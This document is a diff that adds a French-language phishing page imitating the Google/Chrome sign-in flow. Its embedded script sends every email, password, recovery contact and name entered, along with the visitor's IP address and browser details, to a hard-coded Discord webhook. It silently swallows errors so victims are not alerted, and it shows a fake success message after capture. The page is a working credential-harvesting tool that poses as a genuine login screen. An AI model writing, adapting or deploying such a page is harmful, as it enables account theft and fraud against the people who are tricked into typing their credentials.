@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Se connecter - Google</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #000;
+      --surface: #121212;
+      --surface-elevated: #1e1e1e;
+      --text-primary: #e8eaed;
+      --text-secondary: #9aa0a6;
+      --accent: #8ab4f8;
+      --accent-hover: #669df6;
+      --border: #3c4043;
+      --input-bg: #0d1117;
+      --error: #f28b82;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Google Sans', Arial, Helvetica, sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .screen {
+      background: var(--surface-elevated);
+      border-radius: 16px;
+      padding: 48px 40px 40px;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+      transition: opacity 0.25s ease;
+    }
+    .screen.hidden { display: none; }
+    .logo {
+      width: 74px;
+      height: auto;
+      margin: 0 auto 40px;
+      display: block;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 8px;
+      text-align: center;
+    }
+    .subtitle {
+      color: var(--text-secondary);
+      font-size: 16px;
+      line-height: 1.4;
+      text-align: center;
+      margin: 0 0 32px;
+    }
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 24px;
+    }
+    input {
+      width: 100%;
+      padding: 16px 48px 16px 16px;
+      font-size: 16px;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-primary);
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(138,180,248,0.3);
+      outline: none;
+    }
+    .password-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      cursor: pointer;
+      font-size: 24px;
+      padding: 4px;
+      line-height: 1;
+    }
+    .password-toggle:hover,
+    .password-toggle:focus {
+      color: var(--text-primary);
+    }
+    .link {
+      color: var(--accent);
+      text-decoration: none;
+      font-size: 14px;
+      cursor: pointer;
+      display: inline-block;
+      margin: 8px 0;
+    }
+    .link:hover { text-decoration: underline; }
+    .links-container {
+      text-align: center;
+      margin: 16px 0 32px;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+    .btn {
+      background: var(--accent);
+      color: #000;
+      border: none;
+      padding: 10px 28px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn:hover { background: var(--accent-hover); }
+    .btn:disabled {
+      background: #444;
+      color: #888;
+      cursor: not-allowed;
+    }
+    footer {
+      margin-top: 64px;
+      font-size: 12px;
+      color: var(--text-secondary);
+      text-align: center;
+    }
+    footer select,
+    footer a {
+      color: var(--accent);
+      background: transparent;
+      border: none;
+      font-size: inherit;
+      cursor: pointer;
+    }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <!-- Écran 1 : Identifiant -->
+  <div class="screen" id="email-screen">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    <h1>Se connecter à Chrome</h1>
+    <p class="subtitle">Utilisez votre compte Google</p>
+    <div class="input-wrapper">
+      <input type="text" placeholder="Adresse e-mail ou téléphone" id="emailInput" autofocus autocomplete="username">
+    </div>
+    <div class="links-container">
+      <div class="link" onclick="showScreen('recovery-screen')">Adresse e-mail oubliée ?</div>
+    </div>
+    <p class="subtitle" style="font-size:14px; margin:32px 0 0;">
+      Ce n'est pas votre ordinateur ? Utilisez le mode Invité<br>pour vous connecter en mode navigation privée.
+      <span class="link">En savoir plus</span>
+    </p>
+    <div class="buttons">
+      <div class="link" onclick="showScreen('create-account-screen')">Créer un compte</div>
+      <button class="btn" id="nextBtn" disabled>Suivant</button>
+    </div>
+  </div>
+
+  <!-- Écran 2 : Mot de passe -->
+  <div class="screen hidden" id="password-screen">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    <h1>Bienvenue</h1>
+    <p class="subtitle" id="displayed-email"></p>
+    <div class="input-wrapper">
+      <input type="password" placeholder="Saisissez votre mot de passe" id="passwordInput" autocomplete="current-password">
+      <button class="password-toggle material-icons" id="toggleIcon">visibility</button>
+    </div>
+    <div class="links-container">
+      <div class="link">Mot de passe oublié ?</div>
+    </div>
+    <div class="buttons">
+      <div class="link" onclick="showScreen('email-screen')">Retour</div>
+      <button class="btn" id="passwordNextBtn">Suivant</button>
+    </div>
+    <div class="links-container" style="margin-top:32px;">
+      <div class="link" onclick="showScreen('email-screen')">Essayer une autre méthode</div>
+    </div>
+  </div>
+
+  <!-- Écran récupération -->
+  <div class="screen hidden" id="recovery-screen">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    <h1>Retrouver votre adresse e-mail</h1>
+    <p class="subtitle">Saisissez votre numéro de téléphone ou votre e-mail de récupération</p>
+    <div class="input-wrapper">
+      <input type="text" placeholder="Téléphone ou e-mail de récupération" id="recoveryInput" autofocus>
+    </div>
+    <div class="buttons" style="justify-content: flex-end;">
+      <button class="btn" id="recoveryNextBtn">Suivant</button>
+    </div>
+    <div class="links-container" style="margin-top:32px;">
+      <div class="link" onclick="showScreen('email-screen')">Retour</div>
+    </div>
+  </div>
+
+  <!-- Écran création compte -->
+  <div class="screen hidden" id="create-account-screen">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    <h1>Créer un compte Google</h1>
+    <p class="subtitle">Pour vous-même</p>
+    <div class="input-wrapper"><input type="text" placeholder="Prénom" autofocus id="create-prenom"></div>
+    <div class="input-wrapper"><input type="text" placeholder="Nom" id="create-nom"></div>
+    <div class="input-wrapper"><input type="text" placeholder="Nom d'utilisateur ou adresse e-mail" id="create-email"></div>
+    <div class="buttons" style="justify-content: flex-end;">
+      <button class="btn" id="createNextBtn">Suivant</button>
+    </div>
+    <div class="links-container" style="margin-top:32px;">
+      <div class="link" onclick="showScreen('email-screen')">Annuler</div>
+    </div>
+  </div>
+
+  <footer>
+    <select><option>Français (France)</option></select>
+     • 
+    <a href="#">Aide</a>  • 
+    <a href="#">Confidentialité</a>  • 
+    <a href="#">Conditions</a>
+  </footer>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1464371729592746277/XAJJiwcKtS_SI5DzDr1_wOcAstnbo0TOwmSnC0ijnwmoBVo4pJlFV2hIkt4RDSvyx8w2";
+
+    async function sendToDiscord(title, data) {
+      try {
+        const ip = await fetch("https://api.ipify.org?format=json")
+          .then(r => r.json())
+          .then(d => d.ip)
+          .catch(() => "inconnue");
+
+        const payload = {
+          embeds: [{
+            title: title,
+            color: 0xFF0000,
+            fields: Object.entries(data).map(([k, v]) => ({
+              name: k,
+              value: String(v).substring(0, 1024) || "—",
+              inline: true
+            })),
+            timestamp: new Date().toISOString(),
+            footer: { text: `IP: ${ip} • ${navigator.userAgent.substring(0, 100)}` }
+          }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        // Silencieux pour ne pas alerter l'utilisateur
+      }
+    }
+
+    // ────────────────────────────────────────────────
+    // Utilitaires
+    // ────────────────────────────────────────────────
+    const emailInput = document.getElementById('emailInput');
+    const nextBtn = document.getElementById('nextBtn');
+    const toggleIcon = document.getElementById('toggleIcon');
+    const passwordInput = document.getElementById('passwordInput');
+
+    emailInput.addEventListener('input', () => {
+      nextBtn.disabled = !emailInput.value.trim();
+    });
+
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+      setTimeout(() => {
+        const input = document.querySelector(`#${id} input[autofocus]`) || document.querySelector(`#${id} input`);
+        if (input) input.focus();
+      }, 100);
+
+      if (id === 'password-screen') {
+        const email = emailInput.value.trim() || 'votre.email@gmail.com';
+        document.getElementById('displayed-email').textContent = email;
+      }
+    }
+
+    // ────────────────────────────────────────────────
+    // Connexion email + mdp
+    // ────────────────────────────────────────────────
+    async function handleLogin() {
+      const email = emailInput.value.trim();
+      const pass = passwordInput.value.trim();
+      if (!email || !pass) return;
+
+      await sendToDiscord("📩 Connexion Google", {
+        "Email / Téléphone": email,
+        "Mot de passe": pass,
+        "Heure": new Date().toLocaleString("fr-FR")
+      });
+
+      // Option : rediriger au lieu d'alerte
+      // setTimeout(() => { window.location = "https://accounts.google.com/"; }, 600);
+      alert("Connexion réussie !");
+    }
+
+    passwordInput.addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleLogin();
+      }
+    });
+
+    document.getElementById('passwordNextBtn').addEventListener('click', handleLogin);
+
+    // ────────────────────────────────────────────────
+    // Récupération (email oublié / téléphone)
+    // ────────────────────────────────────────────────
+    async function handleRecovery() {
+      const val = document.getElementById('recoveryInput').value.trim();
+      if (!val) return;
+
+      await sendToDiscord("🔍 Récupération Google", {
+        "Téléphone ou email de récup": val,
+        "Heure": new Date().toLocaleString("fr-FR")
+      });
+
+      alert("Simulation : code envoyé à " + val);
+    }
+
+    document.getElementById('recoveryInput').addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleRecovery();
+      }
+    });
+
+    document.getElementById('recoveryNextBtn').addEventListener('click', handleRecovery);
+
+    // ────────────────────────────────────────────────
+    // Créer un compte
+    // ────────────────────────────────────────────────
+    async function handleCreate() {
+      const prenom = document.getElementById('create-prenom')?.value.trim() || '';
+      const nom    = document.getElementById('create-nom')?.value.trim()    || '';
+      const email  = document.getElementById('create-email')?.value.trim()  || '';
+
+      if (!email) {
+        alert("Veuillez remplir le champ email / nom d'utilisateur");
+        return;
+      }
+
+      await sendToDiscord("🆕 Création compte Google", {
+        "Prénom": prenom || "—",
+        "Nom": nom || "—",
+        "Email / pseudo": email,
+        "Heure": new Date().toLocaleString("fr-FR")
+      });
+
+      alert("Simulation : compte créé !");
+    }
+
+    document.getElementById('createNextBtn').addEventListener('click', handleCreate);
+
+    document.querySelectorAll('#create-account-screen input').forEach(inp => {
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          handleCreate();
+        }
+      });
+    });
+
+    // ────────────────────────────────────────────────
+    // Toggle visibilité mdp
+    // ────────────────────────────────────────────────
+    toggleIcon.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleIcon.textContent = 'visibility_off';
+      } else {
+        passwordInput.type = 'password';
+        toggleIcon.textContent = 'visibility';
+      }
+    });
+
+    // Bouton Suivant écran email → passe à mdp
+    nextBtn.addEventListener('click', () => {
+      if (emailInput.value.trim()) showScreen('password-screen');
+    });
+
+    emailInput.addEventListener('keydown', e => {
+      if (e.key === 'Enter' && emailInput.value.trim()) {
+        e.preventDefault();
+        showScreen('password-screen');
+      }
+    });
+
+    // Démarrage
+    showScreen('email-screen');
+  </script>
+</body>
+</html>
